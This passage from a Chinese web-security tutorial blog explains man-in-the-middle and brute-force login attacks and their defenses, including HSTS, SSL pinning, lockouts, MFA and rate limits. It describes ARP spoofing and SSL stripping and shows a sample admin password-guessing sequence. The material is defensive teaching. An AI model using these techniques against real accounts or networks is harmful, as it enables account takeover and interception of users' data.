<td>文件名白名单</td>
<td>最简单有效</td>
<td>⭐⭐⭐⭐</td>
</tr>
<tr>
<td>不暴露真实路径</td>
<td>拒绝路径参数控制</td>
<td>⭐⭐⭐</td>
</tr>
</tbody></table>
<hr>
<h2 id="🧱-类比理解："><a href="#🧱-类比理解：" class="headerlink" title="🧱 类比理解："></a>🧱 类比理解：</h2><table>
<thead>
<tr>
<th>攻击类型</th>
<th>类比</th>
</tr>
</thead>
<tbody><tr>
<td>SQL 注入</td>
<td>攻击者输入语句，控制数据库</td>
</tr>
<tr>
<td>命令注入</td>
<td>攻击者输入命令，控制服务器</td>
</tr>
<tr>
<td>目录遍历</td>
<td>攻击者“走楼梯”溜出安全区，偷看你文件</td>
</tr>
</tbody></table>
<hr>
<p>当然可以，我们来详细通俗地讲解：</p>
<hr>
<h2 id="📱-七、中间人攻击（MITM，Man-In-The-Middle）"><a href="#📱-七、中间人攻击（MITM，Man-In-The-Middle）" class="headerlink" title="📱 七、中间人攻击（MITM，Man-In-The-Middle）"></a>📱 七、中间人攻击（MITM，Man-In-The-Middle）</h2><h3 id="💣-描述："><a href="#💣-描述：" class="headerlink" title="💣 描述："></a>💣 描述：</h3><p><strong>中间人攻击（MITM）</strong>，顾名思义是指攻击者偷偷“夹在用户与服务器之间”，监听、篡改你们的通信内容。</p>
<p>它就像你打电话时，电话线路中有人偷偷拿了个分线器在偷听，还能改你说的话。</p>
<hr>
<h2 id="🔓-举个现实场景："><a href="#🔓-举个现实场景：" class="headerlink" title="🔓 举个现实场景："></a>🔓 举个现实场景：</h2><p>你在星巴克用免费 Wi-Fi 登录银行网站。</p>
<p>你输入了账号和密码，网页看起来正常……</p>
<p>但！这时候：</p>
<ul>
<li><p>攻击者搭建了一个假 Wi-Fi</p>
</li>
<li><p>或者使用 ARP 欺骗将自己设为网关</p>
</li>
<li><p>他捕获了你的请求，并“伪装成银行服务器”</p>
</li>
</ul>
<p>你输入的账号密码，在中间人那里“过了一遍”。</p>
<blockquote>
<p><strong>你以为你连的是银行，实际上你连的是攻击者，然后攻击者再帮你转发到真正的银行。</strong></p>
</blockquote>
<hr>
<h2 id="🧨-常见中间人攻击方式："><a href="#🧨-常见中间人攻击方式：" class="headerlink" title="🧨 常见中间人攻击方式："></a>🧨 常见中间人攻击方式：</h2><table>
<thead>
<tr>
<th>类型</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>🌐 公共 Wi-Fi 劫持</td>
<td>虚假热点监听 HTTP 流量</td>
</tr>
<tr>
<td>🔐 HTTPS 降级攻击</td>
<td>强制浏览器用 HTTP 连接</td>
</tr>
<tr>
<td>🧬 DNS 欺骗</td>
<td>把你引导到假服务器</td>
</tr>
<tr>
<td>🔌 SSL Strip</td>
<td>把 HTTPS 转成 HTTP 转发</td>
</tr>
<tr>
<td>📲 移动 App 劫持</td>
<td>模拟 App 接口劫持数据（尤其安卓）</td>
</tr>
</tbody></table>
<hr>
<h2 id="🛡-如何防御中间人攻击？"><a href="#🛡-如何防御中间人攻击？" class="headerlink" title="🛡 如何防御中间人攻击？"></a>🛡 如何防御中间人攻击？</h2><hr>
<h3 id="✅-1-全站强制使用-HTTPS"><a href="#✅-1-全站强制使用-HTTPS" class="headerlink" title="✅ 1. 全站强制使用 HTTPS"></a>✅ 1. 全站强制使用 <strong>HTTPS</strong></h3><ul>
<li><p>永远使用加密的 HTTPS 通信</p>
</li>
<li><p>杜绝 HTTP 明文传输（登录页面也不行）</p>
</li>
</ul>
<h4 id="⚠️-不安全例子："><a href="#⚠️-不安全例子：" class="headerlink" title="⚠️ 不安全例子："></a>⚠️ 不安全例子：</h4><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://bank.com/login</span><br></pre></td></tr></table></figure>

<p>攻击者可直接看到账号密码！</p>
<hr>
<h3 id="✅-2-启用-HSTS（HTTP-Strict-Transport-Security）"><a href="#✅-2-启用-HSTS（HTTP-Strict-Transport-Security）" class="headerlink" title="✅ 2. 启用 HSTS（HTTP Strict Transport Security）"></a>✅ 2. 启用 <strong>HSTS（HTTP Strict Transport Security）</strong></h3><ul>
<li><p>浏览器访问你的网站后，记住“永远用 HTTPS”</p>
</li>
<li><p>即便用户下一次输入 <code>http://</code>，也会自动跳转到 <code>https://</code></p>
</li>
</ul>
<h4 id="HSTS-头部设置（Nginx-示例）："><a href="#HSTS-头部设置（Nginx-示例）：" class="headerlink" title="HSTS 头部设置（Nginx 示例）："></a>HSTS 头部设置（Nginx 示例）：</h4><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">add_header</span> Strict-Transport-Security <span class="string">&quot;max-age=31536000; includeSubDomains&quot;</span> always;</span><br></pre></td></tr></table></figure>

<p>这样，攻击者无法用“降级攻击”将用户强行切换到 HTTP。</p>
<hr>
<h3 id="✅-3-移动应用使用-SSL-Pinning（证书钉扎）"><a href="#✅-3-移动应用使用-SSL-Pinning（证书钉扎）" class="headerlink" title="✅ 3. 移动应用使用 SSL Pinning（证书钉扎）"></a>✅ 3. 移动应用使用 <strong>SSL Pinning（证书钉扎）</strong></h3><p>在 Android &#x2F; iOS App 中：</p>
<ul>
<li><p>你可以把服务器的 <strong>证书信息</strong>（或公钥）内置到 App 里</p>
</li>
<li><p>App 连接服务器时<strong>必须验证证书是否一致</strong></p>
</li>
<li><p>即使攻击者伪造了一个“合法 SSL 证书”，App 也会拒绝连接</p>
</li>
</ul>
<h4 id="SSL-Pinning-效果："><a href="#SSL-Pinning-效果：" class="headerlink" title="SSL Pinning 效果："></a>SSL Pinning 效果：</h4><table>
<thead>
<tr>
<th>正常通信</th>
<th>验证成功</th>
</tr>
</thead>
<tbody><tr>
<td>攻击者伪造</td>
<td>验证失败，App 拒绝连接</td>
</tr>
</tbody></table>
<hr>
<h3 id="✅-4-不在公共-Wi-Fi-下传输敏感数据"><a href="#✅-4-不在公共-Wi-Fi-下传输敏感数据" class="headerlink" title="✅ 4. 不在公共 Wi-Fi 下传输敏感数据"></a>✅ 4. 不在公共 Wi-Fi 下传输敏感数据</h3><ul>
<li><p>不要在机场、酒店、咖啡馆等公共 Wi-Fi 登录银行、企业后台、支付服务</p>
</li>
<li><p>实在要用，可以开 VPN 或热点</p>
</li>
</ul>
<hr>
<h2 id="🔐-举个简单-HTTPS-对比图："><a href="#🔐-举个简单-HTTPS-对比图：" class="headerlink" title="🔐 举个简单 HTTPS 对比图："></a>🔐 举个简单 HTTPS 对比图：</h2><table>
<thead>
<tr>
<th>类型</th>
<th>是否加密</th>
<th>是否防篡改</th>
<th>是否防监听</th>
</tr>
</thead>
<tbody><tr>
<td>HTTP</td>
<td>❌ 明文</td>
<td>❌ 可篡改</td>
<td>❌ 可监听</td>
</tr>
<tr>
<td>HTTPS</td>
<td>✅ 加密</td>
<td>✅ 校验</td>
<td>✅ 安全通信</td>
</tr>
</tbody></table>
<hr>
<h2 id="🧱-类比理解：-1"><a href="#🧱-类比理解：-1" class="headerlink" title="🧱 类比理解："></a>🧱 类比理解：</h2><table>
<thead>
<tr>
<th>漏洞类型</th>
<th>类比</th>
</tr>
</thead>
<tbody><tr>
<td>SQL 注入</td>
<td>你把密码贴在门上，别人抄走了</td>
</tr>
<tr>
<td>XSS</td>
<td>你在聊天室输入一段话，被篡改成了病毒链接</td>
</tr>
<tr>
<td>MITM</td>
<td>你给朋友打电话，中途有人插线偷听，还改了你说的话</td>
</tr>
</tbody></table>
<hr>
<h2 id="✅-总结一张表：-1"><a href="#✅-总结一张表：-1" class="headerlink" title="✅ 总结一张表："></a>✅ 总结一张表：</h2><table>
<thead>
<tr>
<th>防御措施</th>
<th>描述</th>
<th>推荐程度</th>
</tr>
</thead>
<tbody><tr>
<td>使用 HTTPS</td>
<td>加密所有数据传输</td>
<td>⭐⭐⭐⭐⭐</td>
</tr>
<tr>
<td>设置 HSTS</td>
<td>防止被降级为 HTTP</td>
<td>⭐⭐⭐⭐</td>
</tr>
<tr>
<td>SSL Pinning</td>
<td>移动端防伪造证书</td>
<td>⭐⭐⭐⭐</td>
</tr>
<tr>
<td>避免公共 Wi-Fi</td>
<td>减少被监听风险</td>
<td>⭐⭐⭐</td>
</tr>
</tbody></table>
<hr>
<p>当然可以，我们来通俗详细地讲解：</p>
<hr>
<h2 id="📌-八、暴力破解-爆破攻击（Brute-force-Attack）"><a href="#📌-八、暴力破解-爆破攻击（Brute-force-Attack）" class="headerlink" title="📌 八、暴力破解 &#x2F; 爆破攻击（Brute-force Attack）"></a>📌 八、暴力破解 &#x2F; 爆破攻击（Brute-force Attack）</h2><h3 id="🧨-描述："><a href="#🧨-描述：" class="headerlink" title="🧨 描述："></a>🧨 描述：</h3><p><strong>暴力破解（Brute-force）</strong> 是指攻击者通过<strong>不断尝试各种用户名和密码组合</strong>，来“撞开”某个账户。</p>
<blockquote>
<p>它就像试图用一把钥匙打开锁，但你有一个自动开锁机，每秒试几百次，总有一把能开。</p>
</blockquote>
<hr>
<h2 id="🎯-攻击类型"><a href="#🎯-攻击类型" class="headerlink" title="🎯 攻击类型"></a>🎯 攻击类型</h2><table>
<thead>
<tr>
<th>类型</th>
<th>举例</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>📋 字典攻击</td>
<td>使用常见密码字典：<code>123456</code>、<code>password</code>、<code>admin123</code> 等</td>
<td></td>
</tr>
<tr>
<td>🔁 全组合攻击</td>
<td>按字符排列从 <code>aaaaa</code> 到 <code>zzzzz9999</code> 全部尝试</td>
<td></td>
</tr>
<tr>
<td>🧠 智能爆破</td>
<td>利用用户名关联信息：如生日、手机号等</td>
<td></td>
</tr>
</tbody></table>
<p>攻击目标一般包括：</p>
<ul>
<li><p>登录页面</p>
</li>
<li><p>管理后台</p>
</li>
<li><p>API 接口（如 <code>/auth/login</code>）</p>
</li>
<li><p>邮箱系统、VPN、SSH 等服务</p>
</li>
</ul>
<hr>
<h2 id="🔍-示例（假设你是网站管理员）"><a href="#🔍-示例（假设你是网站管理员）" class="headerlink" title="🔍 示例（假设你是网站管理员）"></a>🔍 示例（假设你是网站管理员）</h2><p>攻击者使用工具对你的网站登录页发起请求：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST /login</span><br><span class="line">&#123; username: &quot;admin&quot;, password: &quot;123456&quot; &#125;</span><br></pre></td></tr></table></figure>

<p>接下来：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">admin / 123456</span><br><span class="line">admin / 12345678</span><br><span class="line">admin / password</span><br><span class="line">admin / qwerty</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>💥 如果你没有任何防护，他们可能几分钟就撞出来一个管理员账户！</p>
<hr>
<h2 id="🛡-如何防御暴力破解攻击？"><a href="#🛡-如何防御暴力破解攻击？" class="headerlink" title="🛡 如何防御暴力破解攻击？"></a>🛡 如何防御暴力破解攻击？</h2><hr>
<h3 id="✅-1-登录失败次数限制（账户锁定-验证码）"><a href="#✅-1-登录失败次数限制（账户锁定-验证码）" class="headerlink" title="✅ 1. 登录失败次数限制（账户锁定 + 验证码）"></a>✅ 1. 登录失败次数限制（账户锁定 + 验证码）</h3><p><strong>策略</strong>：连续错误 N 次（如 5 次），暂时锁定账号或弹出验证码。</p>
<h4 id="示例机制："><a href="#示例机制：" class="headerlink" title="示例机制："></a>示例机制：</h4><table>
<thead>
<tr>
<th>尝试次数</th>
<th>结果</th>
</tr>
</thead>
<tbody><tr>
<td>1~4 次</td>
<td>正常</td>
</tr>
<tr>
<td>第 5 次</td>
<td>弹验证码或冻结 10 分钟</td>
</tr>
<tr>
<td>第 6 次</td>
<td>提示：稍后再试</td>
</tr>
</tbody></table>
<p>✔️ 可以有效防止暴力破解机器人连续尝试。</p>
<hr>
<h3 id="✅-2-启用-多因素认证（MFA-2FA）"><a href="#✅-2-启用-多因素认证（MFA-2FA）" class="headerlink" title="✅ 2. 启用 多因素认证（MFA &#x2F; 2FA）"></a>✅ 2. 启用 <strong>多因素认证（MFA &#x2F; 2FA）</strong></h3><p>即使密码被爆破，仍需：</p>
<ul>
<li><p>手机短信验证码</p>
</li>
<li><p>邮箱确认</p>
</li>
<li><p>动态令牌（如 Google Authenticator）</p>
</li>
</ul>
<h4 id="示例流程："><a href="#示例流程：" class="headerlink" title="示例流程："></a>示例流程：</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1. 输入用户名 + 密码</span><br><span class="line">2. 系统发送 6 位验证码到手机</span><br><span class="line">3. 成功登录</span><br></pre></td></tr></table></figure>

<p>📌 这样即使密码被撞出，没有第二步验证，攻击者仍然无法登录。</p>
<hr>
<h3 id="✅-3-对登录请求设置-IP-速率限制"><a href="#✅-3-对登录请求设置-IP-速率限制" class="headerlink" title="✅ 3. 对登录请求设置 IP 速率限制"></a>✅ 3. 对登录请求设置 <strong>IP 速率限制</strong></h3><p>通过中间件 &#x2F; 防火墙限制每个 IP 的请求频率：</p>
<ul>
<li><p>每分钟不超过 5 次登录请求</p>
</li>
<li><p>同一 IP 多次失败，自动封禁 X 分钟</p>
</li>
</ul>
<p>🛡️ 这样机器人每秒上千次尝试的“优势”将被削弱。</p>
<hr>
<h3 id="✅-4-检测异常行为"><a href="#✅-4-检测异常行为" class="headerlink" title="✅ 4. 检测异常行为"></a>✅ 4. 检测异常行为</h3><p>结合用户行为分析：</p>
<ul>
<li><p>登录地变更太大（如上一秒在北京，下一秒在俄罗斯）</p>
</li>
<li><p>短时间内多个 IP 尝试同一账户</p>
</li>
<li><p>同一 IP 多个账户被尝试</p>
</li>
</ul>
<p>→ 可触发警报、验证码或锁定机制。</p>
<hr>
<h2 id="💡-示例防护实现（伪代码）"><a href="#💡-示例防护实现（伪代码）" class="headerlink" title="💡 示例防护实现（伪代码）"></a>💡 示例防护实现（伪代码）</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (loginFails &gt; <span class="number">5</span>) &#123;</span><br><span class="line">    showCaptcha();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (tooManyAttemptsFromIP(ip)) &#123;</span><br><span class="line">    blockIP(ip, <span class="number">10</span> minutes);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="🧱-类比理解：-2"><a href="#🧱-类比理解：-2" class="headerlink" title="🧱 类比理解："></a>🧱 类比理解：</h2><table>
<thead>
<tr>
<th>攻击</th>
<th>类比</th>
</tr>
</thead>
<tbody><tr>
<td>SQL 注入</td>
<td>入室盗窃：通过漏洞撬门</td>
</tr>
<tr>
<td>命令注入</td>
<td>破坏控制系统</td>
</tr>
<tr>
<td>暴力破解</td>
<td>拿着万能钥匙挨个试</td>
</tr>
</tbody></table>
<hr>
<h2 id="✅-总结一张表：-2"><a href="#✅-总结一张表：-2" class="headerlink" title="✅ 总结一张表："></a>✅ 总结一张表：</h2><table>
<thead>
<tr>
<th>防御措施</th>
<th>作用</th>
<th>推荐指数</th>
</tr>
</thead>
<tbody><tr>
<td>登录失败次数限制</td>
<td>避免无脑尝试</td>
<td>⭐⭐⭐⭐⭐</td>
</tr>
<tr>
<td>启用多因素认证</td>
<td>即使密码泄露也安全</td>
<td>⭐⭐⭐⭐⭐</td>
</tr>
<tr>
<td>IP 速率限制</td>
<td>控制暴力程序</td>
<td>⭐⭐⭐⭐</td>
</tr>
<tr>
<td>异常检测</td>
<td>增加防御维度</td>
<td>⭐⭐⭐</td>
</tr>
</tbody></table>
<hr>
<h2 id="🛡️-其他建议"><a href="#🛡️-其他建议" class="headerlink" title="🛡️ 其他建议"></a>🛡️ 其他建议</h2><ul>
<li><p>使用 Web 安全扫描工具（如 <strong>OWASP ZAP</strong>、<strong>Burp Suite</strong>）进行检测。</p>
</li>
<li><p>了解并遵循 <strong>OWASP Top 10</strong> 安全实践。</p>
</li>
<li><p>定期更新依赖组件和框架，修补已知漏洞。</p>
</li>
<li><p>实施 <strong>最小权限原则</strong> 和访问控制。</p>
</li>
</ul>
<hr>

                    
                </div>

                

                <div class="post-bottom-tags-and-share border-box">
                    <div>
                        
                    </div>
                    <div>
                        
                    </div>
                </div>

                

                
                    <div class="post-nav border-box">
                        
                            <div class="prev-post">
                                <a class="prev"
                                   rel="prev"
                                   href="/js-%E6%95%B0%E7%BB%84%E5%88%A0%E9%99%A4%E6%97%B6%E9%97%B4%E5%A4%8D%E6%9D%82%E5%BA%A6/"
                                   title=""
                                >
                                    <span class="left arrow-icon flex-center">
                                        <i class="fas fa-chevron-left"></i>
                                    </span>
                                    <span class="title flex-center">
                                        <span class="post-nav-title-item text-ellipsis"></span>
                                        <span class="post-nav-item">Prev posts</span>
                                    </span>
                                </a>
                            </div>
                        
                        
                            <div class="next-post">
                                <a class="next"
                                   rel="next"
                                   href="/js-%E5%8F%98%E9%87%8F%E6%8F%90%E5%8D%87/"
                                   title=""
                                >
                                    <span class="title flex-center">
                                        <span class="post-nav-title-item text-ellipsis"></span>
                                        <span class="post-nav-item">Next posts</span>
                                    </span>
                                    <span class="right arrow-icon flex-center">
                                        <i class="fas fa-chevron-right"></i>
                                    </span>
                                </a>
                            </div>
                        
                    </div>
                

                
                    






                
            </div>
        </div>

        
    </div>
</div>


                
            </div>
        </div>

        <div class="page-main-content-bottom border-box">
            
<footer class="footer border-box">
    <div class="copyright-info info-item">
        &copy;&nbsp;<span>2020</span>&nbsp;-&nbsp;2025
        
            &nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;&nbsp;<a href="/">Keep Team</a>
        
    </div>

    <div class="theme-info info-item">
        Powered by&nbsp;<a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;&&nbsp;Theme&nbsp;<a class="keep-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep</a>
    </div>

    

    

    
</footer>

        </div>
    </div>

    <!-- post tools -->
    
        <div class="post-tools right-toc">
            <div class="post-tools-container border-box">
    <ul class="post-tools-list border-box">
        <!-- PC encrypt again -->
        

        <!-- PC TOC show toggle -->
        

        <!-- PC go comment -->
        

        <!-- PC full screen -->
        <li class="tools-item flex-center full-screen">
            <i class="fa-solid fa-expand"></i>
        </li>
    </ul>
</div>

        </div>
    

    <!-- side tools -->
    <div class="side-tools">
        <div class="side-tools-container border-box ">
    <ul class="side-tools-list side-tools-show-handle border-box">
        <li class="tools-item tool-font-adjust-plus flex-center">
            <i class="fas fa-search-plus"></i>
        </li>

        <li class="tools-item tool-font-adjust-minus flex-center">
            <i class="fas fa-search-minus"></i>
        </li>

        <!-- toggle mode -->
        
            <li class="tools-item tool-toggle-theme-mode flex-center">
                <i class="fas fa-moon"></i>
            </li>
        

        <!-- rss -->
        

        <!-- to bottom -->
        <li class="tools-item tool-scroll-to-bottom flex-center">
            <i class="fas fa-arrow-down"></i>
        </li>
    </ul>

    <ul class="exposed-tools-list border-box">
        

        

        <li class="tools-item tool-toggle-show flex-center">
            <i class="fas fa-cog fa-spin"></i>
        </li>

        <li class="tools-item tool-scroll-to-top flex-center show-arrow">
            <i class="arrow fas fa-arrow-up"></i>
            <span class="percent"></span>
        </li>
    </ul>
</div>

    </div>

    <!-- image mask -->
    <div class="zoom-in-image-mask">
    <img class="zoom-in-image">
</div>


    <!-- local search -->
    

    <!-- tablet toc -->
    
</main>





<!-- common js -->

<script src="/js/utils.js"></script>

<script src="/js/header-shrink.js"></script>

<script src="/js/back2top.js"></script>

<script src="/js/toggle-theme.js"></script>

<script src="/js/code-block.js"></script>

<script src="/js/main.js"></script>

<script src="/js/libs/anime.min.js"></script>


<!-- local search -->


<!-- lazyload -->


<div class="">
    <!-- home page -->
    

    <!-- post page -->
    
        <!-- post-helper -->
        
<script src="/js/post/post-helper.js"></script>


        <!-- toc -->
        

        <!-- copyright-info -->
        

        <!-- share -->
        
    

    <!-- categories page -->
    

    <!-- links page -->
    

    <!-- photos page -->
    

    <!-- tools page -->
    
</div>

<!-- mermaid -->


<!-- pjax -->



</body>
</html>
